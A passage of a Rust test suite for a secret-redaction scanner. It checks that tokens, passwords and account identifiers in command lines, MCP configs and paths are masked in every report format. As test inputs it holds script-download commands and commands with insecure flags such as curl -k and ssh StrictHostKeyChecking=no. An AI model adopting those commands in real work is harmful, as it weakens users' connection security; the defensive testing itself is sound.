        vec!["--diff", base.as_str()],
    ] {
        let text = run(&args);
        assert!(
            leaked(&text).is_empty(),
            "{args:?}: account identifiers reached the output: {:?}",
            leaked(&text)
        );
        if args[0] == "--diff" {
            assert!(
                !text.contains("synced"),
                "a rescan of the same synced skills is a change: {text}"
            );
        } else if args[1] == "json" {
            // Positive control: the skills were reported, under the masked names.
            for shown in ["synced/<org>_<account>/x/SKILL.md", "synced/<account>/y/SKILL.md"] {
                assert!(text.contains(shown), "{shown} not in the report: {text}");
            }
        } else if args[1] != "html" {
            // The HTML report shows skill counts only; every other format names them.
            assert!(
                text.contains("<org>_<account>"),
                "{args:?}: the masked name is not shown: {text}"
            );
        }
    }
    let _ = fs::remove_dir_all(&home);
}

/// Single-dash short-flag clusters are modes, not secret names. The secret-name hints that
/// match only as a name's LAST word (PASS, PWD, PAT, JWT, SK; review of b21286f, 6af8a1e)
/// read curl's `-sk` (silent + insecure), `-sSk`, `-fsSk` as a key ending in `SK` and
/// redacted the URL after them: the property test `plain_command_lines_are_untouched`
/// shrank to `-sk a` -> `-sk <redacted>`. Those hints now apply only to names with word
/// structure (`DB_PASS=x`, `--db-pass x`, `-db-pass x`, `--sk x`, `-pass=x`), never to a
/// bare single-dash cluster. Fails on 75c3188 (the `-sk`, `-sSk`, `-fsSk`, `-pat`, `-pwd`,
/// `-jwt`, `-pass`, `-SK` rows).
#[test]
fn short_flag_clusters_are_not_secret_names() {
    use rustmachineguard::scanners::redact_command_text;
    for benign in [
        "-sk a",
        "-sk_ 0xe._",
        "curl -sk https://api.internal/v1/health",
        "curl -sSk https://api.internal/v1/health",
        "curl -fsSk https://get.example.com/install.sh",
        "curl -fsSL -o f https://get.example.com/install.sh",
        "curl -sS https://api.internal",
        "curl -k https://self-signed.internal",
        "curl -skL -X POST https://api.internal/v1/run",
        "curl -sSfLk --retry 3 https://x.internal",
        "wget -qO- https://get.example.com/install.sh",
        "wget -q -O - https://get.example.com",
        "git log -n 5 --oneline",
        "git commit -sm msg",
        // ssh's `-p` is a port and `-i` a key PATH: neither is a value to hide.
        "ssh -i ~/.ssh/id_ed25519 -p 2222 host",
        "ssh -tt -o BatchMode=yes host uptime",
        "scp -P 2222 f host:/tmp/f",
        "gh pr view -w 12",
        "kubectl get pods -n kube-system -o wide",
        "kubectl logs -f deploy/api -c app",
        "tar -xzf a.tgz -C out",
        "rsync -avz src/ host:dst/",
        // Clusters that spell a short hint word whole.
        "tool -pat a",
        "tool -pwd a",
        "tool -jwt a",
        // (`-pass a` is openssl's pass-phrase flag, an explicit table entry since the
        // review fixes: see `review_fixes::openssl_pass_flags_redact`.)
        "tool -SK a",
    ] {
        assert_eq!(
            redact(benign),
            benign,
            "redact_secrets_in_text over-redacted a short-flag cluster"
        );
        assert_eq!(
            redact_command_text(benign),
            benign,
            "redact_command_text over-redacted a short-flag cluster"
        );
    }
}

/// The other side of the short-flag rule: secret names with word structure, Go/openssl
/// style single-dash long names carrying a full hint word (`-token`, `-password`,
/// `-apiKey`), glued `-name=value` forms, and the explicit per-program short flags are all
/// still redacted.
#[test]
fn secret_names_and_program_short_flags_still_redact() {
    use rustmachineguard::scanners::redact_command_text;
    for (input, gone) in [
        ("DB_PASS=SFPW1 ./run.sh", "SFPW1"),
        ("STRIPE_SK=SFPW2 ./run.sh", "SFPW2"),
        ("tool --sk SFPW3", "SFPW3"),
        ("tool --db-pass SFPW4", "SFPW4"),
        ("tool -db-pass SFPW5", "SFPW5"),
        ("tool --github-pat SFPW6", "SFPW6"),
        ("tool -pass=SFPW7", "SFPW7"),
        ("tool -sk=SFPW8", "SFPW8"),
        ("tool -token SFPW9", "SFPW9"),
        ("tool -password SFPW10", "SFPW10"),
        ("openssl rsa -in k.pem -passin pass:SFPW11", "SFPW11"),
        ("tool -apiKey SFPW12", "SFPW12"),
        ("redis-cli -a SFPW13 ping", "SFPW13"),
        ("docker login -u me -p SFPW14 registry.example.com", "SFPW14"),
        ("curl -sk -u admin:SFPW15 https://x.internal", "SFPW15"),
        (
            "curl -sk -H 'Authorization: Bearer SFPW16' https://x.internal",
            "SFPW16",
        ),
        ("mysql -uroot -pSFPW17 db", "SFPW17"),
        ("sshpass -p SFPW18 ssh host", "SFPW18"),
        ("tool -key SFPW19", "SFPW19"),
    ] {
        let out = redact_command_text(input);
        assert!(!out.contains(gone), "{input:?} -> {out:?}");
    }
}

/// A backslash escapes the next character in POSIX sh, so `\ ` (and `\"`, `\'`, `\\`)
/// is part of the current word: `wget --header=Authorization:Bearer\ X` hands wget ONE
/// argument, `Authorization:Bearer X`. Both redactors split words on whitespace alone,
/// redacted the `Bearer\` half and showed `X` as the next argument; the same for every
/// secret-bearing word (header values, `--data` bodies, `-u user:pw`, `KEY=va\ lue`, URL
/// userinfo, a value after a secret flag). ANSI-C `$'...'`, an escaped `\"` inside a
/// double-quoted value, a part glued on after a closing quote (`'a'\ X`, `'a'X`), a
/// space inside a quoted Authorization header after its scheme word, and a line
/// continuation between a flag and its value leaked the same way. Every row fails on
/// f2572b2 in both redactors (the redis/docker/npm rows exist only in
/// redact_command_text, by design). The output keeps the shape: the header name (and an
/// Authorization scheme word) stay, the value is `<redacted>`, and a second pass changes
/// nothing.
#[test]
fn escaped_spaces_and_quote_mixes_stay_inside_the_secret_word() {
    use rustmachineguard::scanners::redact_command_text;
    let both: &[(&str, &str)] = &[
        (
            r"wget --header=Authorization:Bearer\ HX1 u",
            r"wget --header=Authorization:Bearer\ <redacted> u",
        ),
        (
            r"wget --header=Authorization:\ Bearer\ HX2 u",
            r"wget --header=Authorization:\ Bearer\ <redacted> u",
        ),
        (
            r"curl -H Authorization:\ Bearer\ HX3 u",
            r"curl -H Authorization:\ Bearer\ <redacted> u",
        ),
        (
            r"curl -H Authorization:\ token\ HX4 u",
            r"curl -H Authorization:\ token\ <redacted> u",
        ),
        (r"Authorization: Bearer\ HX5", r"Authorization: Bearer\ <redacted>"),
        (r"Bearer\ HX6 u", r"Bearer\ <redacted> u"),
        (r"curl -H X-Api-Key:\ HX7 u", "curl -H X-Api-Key:<redacted> u"),
        (r"curl -H X-Api-Key:a\ HX8 u", "curl -H X-Api-Key:<redacted> u"),
        (r"curl -H Private-Token:\ HX9 u", "curl -H Private-Token:<redacted> u"),
        (r"curl -H Cookie:\ s=HX10 u", "curl -H Cookie:<redacted> u"),
        (r"curl -H Cookie:s=a;\ t=HX11 u", "curl -H Cookie:<redacted> u"),
        (r"curl --data password=a\ HX12 u", "curl --data password=<redacted> u"),
        (r"curl -d token=a\ HX13 u", "curl -d token=<redacted> u"),
        (r"curl -u admin:a\ HX14 u", "curl -u admin:<redacted> u"),
        (r"curl --user=admin:a\ HX15 u", "curl --user=admin:<redacted> u"),
        (r"API_KEY=va\ HX16 ./run", "API_KEY=<redacted> ./run"),
        (r"export GITHUB_TOKEN=a\ HX17", "export GITHUB_TOKEN=<redacted>"),
        (r"TOKEN=a\ b\ HX18 ./run", "TOKEN=<redacted> ./run"),
        (r"tool --password a\ HX19", "tool --password <redacted>"),
        (r"tool --password=a\ HX20", "tool --password=<redacted>"),
        (r"password:\ HX21", "password:<redacted>"),
        (
            r"git clone https://u:a\ HX22@host/r",
            "git clone https://<redacted>@host/r",
        ),
        (
            r"pip install -i https://u:a\ b\ HX23@host/simple x",
            "pip install -i https://<redacted>@host/simple x",
        ),
        (r"mysql -pa\ HX24 db", "mysql -p<redacted> db"),
        (r"sshpass -p a\ HX25 ssh h", "sshpass -p <redacted> ssh h"),
        (
            r"!f() { echo password=a\ HX26; }; f",
            "!f() { echo password=<redacted>; }; f",
        ),
        // ANSI-C quoting: `$'...'` is a quote, and `\'` inside it does not close it.
        (r"TOKEN=$'a HX27' ./run", r"TOKEN=$'<redacted> <redacted>' ./run"),
        (r"TOKEN=$'a\' HX28' ./run", r"TOKEN=$'<redacted> <redacted>' ./run"),
        // `\"` does not close a double quote.
        (
            r#"tool --password "a\" HX29""#,
            r#"tool --password "<redacted> <redacted>""#,
        ),
        (r#"TOKEN="a\" HX30" ./run"#, r#"TOKEN="<redacted> <redacted>" ./run"#),
        (
            r#"curl -H "X-Api-Key: a\" HX31" u"#,
            r#"curl -H "X-Api-Key: <redacted> <redacted>" u"#,
        ),
        // A quoted Authorization header: everything after the scheme word, to the close.
        (
            r#"curl -H "Authorization: Bearer \"a HX32\"" u"#,
            r#"curl -H "Authorization: Bearer <redacted> <redacted>" u"#,
        ),
        (
            r#"curl -H "Authorization: Bearer a HX33" u"#,
            r#"curl -H "Authorization: Bearer <redacted> <redacted>" u"#,
        ),
        (
            r"curl -H 'Authorization: Bearer '\ HX34 u",
            r"curl -H 'Authorization: Bearer <redacted>'<redacted> u",
        ),
        // A part glued on after the closing quote is more of the same word.
        (r"TOKEN='a'\ HX35 ./run", "TOKEN='<redacted>'<redacted> ./run"),
        (r"TOKEN='a'HX36 ./run", "TOKEN='<redacted>'<redacted> ./run"),
        (
            r"TOKEN='a b'\ HX37 ./run",
            "TOKEN='<redacted> <redacted>'<redacted> ./run",
        ),
        (
            r#"TOKEN="a"'b HX38' ./run"#,
            r#"TOKEN="<redacted>"'<redacted> <redacted>' ./run"#,
        ),
        // Escaped JSON inside a double-quoted body.
        (
            r#"curl -d "{\"token\":\"a HX39\"}" u"#,
            r#"curl -d "{\"token\":\"<redacted> <redacted>" u"#,
        ),
        // A line continuation between a flag and its value.
        (
            "tool --token \\\n  HX40 https://h",
            "tool --token \\\n  <redacted> https://h",
        ),
    ];
    let mut failures = Vec::new();
    for (raw, want) in both {
        for (name, f) in [
            ("redact_secrets_in_text", redact as fn(&str) -> String),
            ("redact_command_text", redact_command_text),
        ] {
            let out = f(raw);
            if out != *want || f(&out) != out {
                failures.push(format!("  {name}: {raw:?}\n    -> {out:?}\n    want {want:?}"));
            }
        }
    }
    // Command-text-only rules (program password flags, config set, stdin feeds).
    for (raw, want) in [
        (r"redis-cli -a a\ HX41 ping", "redis-cli -a <redacted> ping"),
        (r"docker login -p a\ HX42 r", "docker login -p <redacted> r"),
        (
            r"npm config set //r/:_authToken a\ HX43",
            "npm config set //r/:_authToken <redacted>",
        ),
        (
            r"echo a\ HX44 | docker login --password-stdin",
            "echo <redacted> | docker login --password-stdin",
        ),
    ] {
        let out = redact_command_text(raw);
        if out != want || redact_command_text(&out) != out {
            failures.push(format!(
                "  redact_command_text: {raw:?}\n    -> {out:?}\n    want {want:?}"
            ));
        }
    }
    assert!(failures.is_empty(), "escaped-word shapes:\n{}", failures.join("\n"));
}

/// The other side: an escaped space or quote outside a secret's word is ordinary shell
/// and passes through both redactors untouched, and `\\` followed by a space is an
/// escaped BACKSLASH (the space then ends the word), so the next word is not the secret.
/// Existing JSON-in-quotes shapes keep their structure, and a quote at the end of a
/// secret word closes the quote an earlier word opened instead of swallowing the rest of
/// the command (f2572b2 redacted `&& echo hi https://h/x` after `sh -c 'TOKEN=X'`).
#[test]
fn escaped_spaces_outside_secrets_pass_through() {
    use rustmachineguard::scanners::redact_command_text;
    for benign in [
        r"cp a\ b c",
        r"curl --output=my\ file https://api.internal/x",
        r"mv my\ notes.txt archive/",
        r#"echo \"quoted\" \'single\' back\\slash"#,
        r"grep -r foo\ bar src/",
        "make build \\\n  && make test",
        r"find . -name \*.rs -exec rustfmt {} \;",
    ] {
        assert_eq!(
            redact(benign),
            benign,
            "redact_secrets_in_text changed a benign command"
        );
        assert_eq!(
            redact_command_text(benign),
            benign,
            "redact_command_text changed a benign command"
        );
    }
    for (raw, want) in [
        (r"TOKEN=a\\ NEXTWORD ./run", r"TOKEN=<redacted> NEXTWORD ./run"),
        (
            "sh -c 'TOKEN=X' && echo hi https://h/x",
            "sh -c 'TOKEN=<redacted>' && echo hi https://h/x",
        ),
        (
            "bash -c \"export TOKEN=X\" && echo hi",
            "bash -c \"export TOKEN=<redacted>\" && echo hi",
        ),
        (
            r#"curl -d '{"token":"X"}' https://h"#,
            r#"curl -d '{"token":"<redacted>"}' https://h"#,
        ),
        (
            r#"-d '{"token" : "X"}' https://h"#,
            r#"-d '{"token" : "<redacted>"}' https://h"#,
        ),
        (
            r#"curl -d "{\"token\":\"X\"}" https://h"#,
            r#"curl -d "{\"token\":\"<redacted>\"}" https://h"#,
        ),
    ] {
        assert_eq!(redact(raw), want, "redact_secrets_in_text on {raw:?}");
        assert_eq!(redact_command_text(raw), want, "redact_command_text on {raw:?}");
    }
}

/// The `KEY` hint matches a WORD of a name, not a substring: `ssh -o
/// StrictHostKeyChecking=no` showed `StrictHostKeyChecking=<redacted>` on f2572b2, and
/// `KEYBOARD`, `MONKEY`, `TURKEY`, `HOTKEY` were secret names. `KEY` as a separated or
/// trailing camelCase word, after a qualifier (`apiKeyId`), or glued onto a stem that is
/// not an English word (`APIKEY`, `sshkey`) still is. The benign rows fail on f2572b2.
#[test]
fn key_hint_matches_whole_words_only() {
    use rustmachineguard::scanners::redact_command_text;
    for benign in [
        "ssh -o StrictHostKeyChecking=no host",
        "ssh -o StrictHostKeyChecking=accept-new -o HostKeyAlgorithms=+ssh-rsa host",
        "KEYBOARD=us ./setup.sh",
        "MONKEY=1 ./chaos.sh",
        "TURKEY=1 ./x",
        "HOTKEY=ctrl+k ./x",
        "tool --keyboard-layout=us",
        "KEYWORD=foo ./search",
    ] {
        assert_eq!(redact(benign), benign, "redact_secrets_in_text over-redacted");
        assert_eq!(redact_command_text(benign), benign, "redact_command_text over-redacted");
    }
    for (raw, gone) in [
        ("API_KEY=KW1 ./run", "KW1"),
        ("apiKey=KW2 ./run", "KW2"),
        ("SECRET_KEY=KW3 ./run", "KW3"),
        ("sshkey=KW4 ./run", "KW4"),
        ("APIKEY=KW5 ./run", "KW5"),
        ("key=KW6 ./run", "KW6"),
        ("KEY_ID=KW7 ./run", "KW7"),
        ("API_KEY2=KW8 ./run", "KW8"),
        ("apiKeyValue=KW9 ./run", "KW9"),
        ("tool --api-key KW10", "KW10"),
        ("tool --key=KW11", "KW11"),
        ("tool -apiKey KW12", "KW12"),
        ("PRIVKEY=KW13 ./run", "KW13"),
        ("OPENAI_API_KEYS=KW14 ./run", "KW14"),
        ("AWS_ACCESS_KEY_ID=KW15 ./run", "KW15"),
        ("curl -H X-Api-Key:KW16 u", "KW16"),
        ("APIKEYVALUE=KW17 ./run", "KW17"),
        ("tool -key KW18", "KW18"),
    ] {
        for out in [redact(raw), redact_command_text(raw)] {
            assert!(!out.contains(gone), "{raw:?} -> {out:?}");
        }
    }
}

/// Review fixes R1, R2, R4 and R6: an MCP or plugin LSP launch whose package spec, flag
/// or argv element carries a credential. Package identity was built from the RAW
/// arguments (`split_npm_package_version` splits at the LAST `@`, so URL userinfo became
/// the npm name, `git+https://TOKEN`), a `-`-prefixed element was taken as a package
/// (`node --api-key=TOKEN server.js` -> `npm:--api-key=TOKEN`), an image's userinfo
/// became its version, and each argv element was tokenized as shell text (the tail after
/// the first space of `--password=a b X` showed). LSP arguments kept `-pVALUE` and
/// `-HAuthorization: Bearer X` verbatim. One canary per shape, in every format (the SBOM
/// purl included) and the `--trace` stream; positive controls name the repository paths
/// the identities now carry. Fails on 8e58777: RVCPKGA..RVCPKGF reach the JSON
/// `package_name`/`package_version`, the SBOM purl and the terminal; RVCARGA..RVCARGD
/// reach `args`; RVCLSPA/RVCLSPB reach `agent_lsp_servers[].args`.
#[test]
fn package_identity_and_argv_canaries_reach_no_format() {
    use std::collections::BTreeSet;
    use std::fs;
    let home = std::env::temp_dir().join(format!("rmg-e2e-pkgid-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(&home).unwrap();
    let home = fs::canonicalize(&home).unwrap();
    let w = |p: std::path::PathBuf, t: &str| {
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, t).unwrap();
    };
    w(
        home.join(".claude.json"),
        r#"{"mcpServers":{
          "a":{"command":"npx","args":["-y","git+https://RVCPKGA@github.com/org/mcp.git"]},
          "b":{"command":"uvx","args":["--from","git+https://x-access-token:RVCPKGB@github.com/o/r","mcp-server"]},
          "c":{"command":"pipx","args":["run","--spec","git+https://u:RVCPKGC@github.com/o/rtwo","app"]},
          "d":{"command":"node","args":["--api-key=RVCPKGD","server.js"]},
          "e":{"command":"docker","args":["run","-i","user:RVCPKGE@registry.example/img:1"]},
          "f":{"command":"python3","args":["-m","--password=RVCPKGF"]},
          "g":{"command":"npx","args":["some-mcp@1.0.0","--header=Authorization:Bearer RVCARGA","--password=a b RVCARGB","-e","API_KEY=a RVCARGC","--token","-RVCARGD"]}
        }}"#,
    );
    // A plugin LSP server with attached short-flag values and a git spec with a token.
    let ip = home.join(".claude/plugins/cache/mk/lp/1.0.0");
    w(
        ip.join(".lsp.json"),
        r#"{"lsp":{"command":"npx","args":["git+https://RVCLSPC@github.com/o/lsp","-pRVCLSPA","-HAuthorization: Bearer RVCLSPB","--stdio"],"extensionToLanguage":{".x":"x"}}}"#,
    );
    w(
        home.join(".claude/plugins/installed_plugins.json"),
        &format!(
            r#"{{"version":2,"plugins":{{"lp@mk":[{{"scope":"user","installPath":"{}","version":"1.0.0"}}]}}}}"#,
            ip.display()
        ),
    );
    let skip = "ai,frameworks,ide,extensions,node,shell,ssh,cloud,containers,notebooks,browser,packages,rules,skills,\
                settings,aicreds,envfiles,transcripts,marketplaces,vscodetasks,gitconfig,pypkgs,npmpkgs,jbplugins,\
                persistence,liveness,playwright,vibe,statusline,listeners";
    let canaries = |text: &str| -> BTreeSet<String> {
        text.match_indices("RVC")
            .map(|(i, _)| {
                let end = text[i + 3..]
                    .find(|c: char| !c.is_ascii_uppercase())
                    .map_or(text.len(), |o| i + 3 + o);
                text[i..end].to_string()
            })
            .filter(|c| c.len() > 3)
            .collect()
    };
    assert_eq!(canaries("x RVCFOO y").len(), 1, "the detector sees a canary");
    for args in [
        &["--format", "json"][..],
        &["--format", "terminal", "--verbose"],
        &["--format", "html"],
        &["--format", "sbom"],
        &["--format", "blueprint"],
        &["--format", "compliance"],
        &["--format", "json", "--trace"],
    ] {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
            .args(args)
            .args(["--skip", skip])
            .env("HOME", &home)
            .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
            .current_dir(&home)
            .output()
            .expect("run rmguard");
        assert!(
            out.status.success(),
            "{args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        let text = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        let leaked = canaries(&text);
        assert!(
            leaked.is_empty(),
            "{args:?}: secret values reached the output: {leaked:?}"
        );
        if args == ["--format", "json"] {
            for shown in [
                "\"package_name\": \"github.com/org/mcp\"",
                "\"package_name\": \"github.com/o/r\"",
                "\"package_name\": \"github.com/o/rtwo\"",
                "\"package_name\": \"registry.example/img\"",
                "\"package_name\": \"server.js\"",
                "--header=Authorization:Bearer <redacted>",
                "--password=<redacted>",
                "API_KEY=<redacted>",
                "\"-p<value>\"",
                "\"-H<value>\"",
                "\"package\": \"github.com/o/lsp@git HEAD\"",
            ] {
                assert!(text.contains(shown), "positive control {shown} missing: {text}");
            }
        }
        if args == ["--format", "sbom"] {
            assert!(
                !text.contains("pkg:npm//")
                    && !text.contains("pkg:npm/server.js")
                    && !text.contains("pkg:npm/github.com"),
                "a path or git source became a purl: {text}"
            );
        }
    }
    let _ = fs::remove_dir_all(&home);
}

/// Review fix R4: the account UUIDs of a synced-skill directory in its ENCODED spelling,
/// as Claude Code names a project directory under `~/.claude/projects/`
/// (`...-skills-synced-<org>-<account>`: the `_` encodes to `-`), never reach a report or
/// the `--trace` stream; the path spelling stays masked too. Fails on 8e58777: the
/// memory file's path under the encoded name shows both UUIDs in JSON, terminal and trace.
#[test]
fn encoded_synced_identifiers_reach_no_output_or_trace() {
    use std::fs;
    const ORG: &str = "3E2E0A1B-2C3D-4E5F-8A9B-0C1D2E3F4A5B";
    const ACCT: &str = "4e2e0a1b-2c3d-4e5f-8a9b-0c1d2e3f4a5c";
    let home = std::env::temp_dir().join(format!("rmg-e2e-encuuid-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(&home).unwrap();
    let home = fs::canonicalize(&home).unwrap();
    let synced = home.join(format!(".claude/skills/synced/{ORG}_{ACCT}/x"));
    let enc = rustmachineguard::platform::encode_project_path(&synced);
    assert!(enc.contains(&format!("synced-{ORG}-{ACCT}")), "{enc}");
    let mem = home.join(".claude/projects").join(&enc).join("memory/MEMORY.md");
    fs::create_dir_all(mem.parent().unwrap()).unwrap();
    fs::write(&mem, "# memory\nRun the deploy.\n").unwrap();
    fs::write(mem.with_file_name("notes.jsonl"), "{}\n").unwrap();
    fs::write(home.join(".claude.json"), "{}").unwrap();
    let leaked = |text: &str| -> Vec<&str> {
        let lower = text.to_ascii_lowercase();
        [ORG, ACCT]
            .into_iter()
            .filter(|u| lower.contains(&u.to_ascii_lowercase()))
            .collect()
    };
    let mut seen_masked = false;
    for args in [
        &["--format", "json"][..],
        &["--format", "terminal", "--verbose"],
        &["--format", "html"],
        &["--format", "sbom"],
        &["--format", "blueprint"],
        &["--format", "json", "--trace"],
    ] {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
            .args(args)
            .args(["--skip", "ai,frameworks,ide,extensions,mcp,node,shell,ssh,cloud,containers,notebooks,browser,packages,aicreds,envfiles,marketplaces,vscodetasks,gitconfig,pypkgs,npmpkgs,jbplugins,persistence,liveness,playwright,vibe,statusline,listeners"])
            .env("HOME", &home)
            .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
            .current_dir(&home)
            .output()
            .expect("run rmguard");
        assert!(
            out.status.success(),
            "{args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        let text = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(
            leaked(&text).is_empty(),
            "{args:?}: account identifiers reached the output: {text}"
        );
        seen_masked |= text.contains("synced-<org>-<account>");
    }
    assert!(
        seen_masked,
        "positive control: the encoded directory was reported under its masked name"
    );
    // The trace stream specifically: every line goes through sanitize_display.
    use rustmachineguard::scanners::{mask_identifiers, sanitize_display};
    let line = format!(
        "trace: read {}/.claude/projects/-h-u--claude-skills-synced-{ORG}-{ACCT}-x/memory/MEMORY.md -> ok",
        home.display()
    );
    assert!(leaked(&sanitize_display(&line, 4096)).is_empty());
    assert_eq!(
        mask_identifiers(&format!("-h--claude-skills-synced-{ACCT}-y")),
        "-h--claude-skills-synced-<account>-y"
    );
    let _ = fs::remove_dir_all(&home);
}
